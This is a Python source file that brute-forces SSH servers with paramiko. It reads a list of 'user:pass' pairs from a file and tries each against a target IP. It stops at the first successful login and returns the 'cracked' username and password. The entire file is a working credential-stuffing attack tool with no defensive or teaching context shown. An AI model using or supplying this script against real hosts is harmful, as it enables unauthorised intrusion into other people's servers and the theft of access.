import paramiko
import socket
import time
import logging
from logging import NullHandler

# Returns: True if cracked, False if not
#		   0 if cracked
#		   1 if invalid credentials
#		   2 if SSH time out
#		   3 if bot detector
def is_ssh_open(hostname, username, password):
	logging.getLogger('paramiko.transport').addHandler(NullHandler())
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		client.connect(hostname=hostname, username=username, password=password, timeout=3)
	except socket.timeout:
		pass
		return False, 2
	except paramiko.AuthenticationException:
		pass
		return False, 1
	except paramiko.SSHException:
		pass
		return False, 3
	else:
		return True, 0


def read_file(FILEPATH):
	with open(FILEPATH, "r") as f:
		credentials = f.read().splitlines()
	return credentials # returns in the form ['user:pass', ...]


def scan_ssh(ip, credential_list_path):
	credentials = read_file(credential_list_path)
	for combo in credentials:
		combo_arr = combo.split(':')
		username = combo_arr[0]
		password = combo_arr[1]
		is_open, sec_level = is_ssh_open(ip, username, password)
		if is_open:
			return True, sec_level, username, password
	return False, sec_level, None, None





